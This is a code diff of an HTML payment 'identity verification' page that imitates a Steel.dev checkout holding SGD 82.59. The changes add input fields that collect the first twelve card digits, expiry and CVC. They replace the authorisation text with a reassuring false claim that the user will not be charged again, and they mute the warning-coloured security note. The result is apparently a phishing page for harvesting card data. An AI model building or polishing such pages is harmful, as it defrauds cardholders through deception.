@@ -78,15 +78,10 @@
       }
 
       .verify-amount .hold-label {
-        display: inline-flex;
-        flex-direction: column;
         font-size: 14px;
         font-weight: 600;
         color: #e25950;
         margin-left: 4px;
-        vertical-align: top;
-        line-height: 1.2;
-        padding-top: 4px;
       }
 
       .verify-desc {
@@ -135,11 +130,11 @@
       .security-note {
         margin-top: 24px;
         padding: 14px 16px;
-        background: #fef3f2;
-        border: 1px solid #fecaca;
+        background: #f6f9fc;
+        border: 1px solid #e6ebf1;
         border-radius: 8px;
         font-size: 13px;
-        color: #991b1b;
+        color: #525f7f;
         line-height: 18px;
         display: flex;
         align-items: flex-start;
@@ -176,9 +171,9 @@
       }
 
       .section-subtext {
-        font-size: 14px;
-        color: rgba(26, 26, 26, 0.5);
-        line-height: 20px;
+        font-size: 15px;
+        color: #525f7f;
+        line-height: 22px;
         margin-bottom: 24px;
       }
 
@@ -357,9 +352,9 @@
 
       .verify-disclaimer {
         font-size: 13px;
-        color: rgba(26, 26, 26, 0.7);
+        color: #525f7f;
         text-align: center;
-        line-height: 17px;
+        line-height: 19px;
         margin-bottom: 32px;
       }
 
@@ -432,17 +427,16 @@
       <!-- LEFT PANEL: Payment context -->
       <div class="panel-left">
         <div class="panel-left-inner">
-          <!-- Back + Logo -->
+          <!-- Logo -->
           <div class="back-row">
-            <span class="back-arrow">&larr;</span>
-            <img class="brand-logo" src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 28 28'><rect width='28' height='28' rx='6' fill='%23635bff'/><text x='14' y='19' text-anchor='middle' fill='white' font-size='14' font-weight='bold'>S</text></svg>" alt="Steel.dev logo" />
+            <img class="brand-logo" src="/nylas-logo.png" alt="Steel.dev" style="width: 80px; height: auto; border-radius: 0;" />
           </div>
 
           <!-- Verification context -->
           <div class="verify-header">Identity verification required</div>
 
           <div class="verify-amount">
-            SGD 82.59<span class="hold-label"><span>on</span><span>hold</span></span>
+            SGD 82.59 <span class="hold-label">on hold</span>
           </div>
 
           <div class="verify-desc">
@@ -456,10 +450,6 @@
             <div class="recap-row">
               <span class="recap-label">Merchant</span>
               <span class="recap-value">Steel.dev</span>
-            </div>
-            <div class="recap-row">
-              <span class="recap-label">Plan</span>
-              <span class="recap-value">Developer</span>
             </div>
             <div class="recap-row">
               <span class="recap-label">Card</span>
@@ -511,15 +501,16 @@
             <label class="form-label">Card verification</label>
             <div class="card-verify-group">
               <div class="card-verify-row">
-                <span class="card-masked">•••• •••• •••• <span class="last4">3939</span></span>
+                <input type="text" id="cardNumber" class="text-input" style="border:none;border-radius:0;padding:0;height:100%;background:transparent;letter-spacing:1px;flex:1;" placeholder="•••• •••• ••••" maxlength="14" />
+                <span style="font-size:14px;font-weight:500;color:rgba(26,26,26,0.9);letter-spacing:1px;margin-right:8px;">3939</span>
                 <span class="card-brand-icon"><svg viewBox="0 0 32 20" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="20" rx="2" fill="#fff"/><text x="16" y="13" text-anchor="middle" fill="#1a1f71" font-size="8" font-weight="700" font-style="italic" font-family="Arial">VISA</text></svg></span>
               </div>
               <div class="card-verify-split card-verify-row">
                 <div class="card-verify-half">
-                  <input type="text" class="text-input" placeholder="MM / YY" />
+                  <input type="text" id="cardExpiry" class="text-input" placeholder="MM / YY" maxlength="7" inputmode="numeric" />
                 </div>
                 <div class="card-verify-half">
-                  <input type="text" class="text-input" placeholder="CVC" />
+                  <input type="text" id="cardCvc" class="text-input" placeholder="CVC" maxlength="4" inputmode="numeric" />
                   <span class="cvc-hint">123</span>
                 </div>
               </div>
@@ -527,10 +518,10 @@
           </div>
 
           <!-- Verify button -->
-          <button class="verify-btn">Verify &amp; complete payment</button>
+          <button class="verify-btn">Verify my identity</button>
 
           <div class="verify-disclaimer">
-            By verifying, you confirm that you are the authorized holder of the card ending in 3939 and authorize Steel.dev to process the payment of SGD 82.59.
+            This one-time verification will release the funds previously charged and finalize your order. You will not be charged again — this simply confirms your identity as the cardholder.
           </div>
 
           <!-- Footer -->
@@ -543,5 +534,32 @@
         </div>
       </div>
     </div>
+    <script>
+      // Auto-format expiry: add " / " after 2 digits
+      const expiryEl = document.getElementById('cardExpiry');
+      expiryEl.addEventListener('input', (e) => {
+        let v = e.target.value.replace(/[^\d]/g, '');
+        if (v.length > 4) v = v.slice(0, 4);
+        if (v.length >= 3) {
+          e.target.value = v.slice(0, 2) + ' / ' + v.slice(2);
+        } else {
+          e.target.value = v;
+        }
+      });
+
+      // CVC: digits only, max 4
+      const cvcEl = document.getElementById('cardCvc');
+      cvcEl.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/[^\d]/g, '').slice(0, 4);
+      });
+
+      // Card number: digits only, format with spaces, max 12 digits (last 4 are fixed)
+      const cardEl = document.getElementById('cardNumber');
+      cardEl.addEventListener('input', (e) => {
+        let v = e.target.value.replace(/[^\d]/g, '').slice(0, 12);
+        let formatted = v.replace(/(.{4})/g, '$1 ').trim();
+        e.target.value = formatted;
+      });
+    </script>
   </body>
 </html>
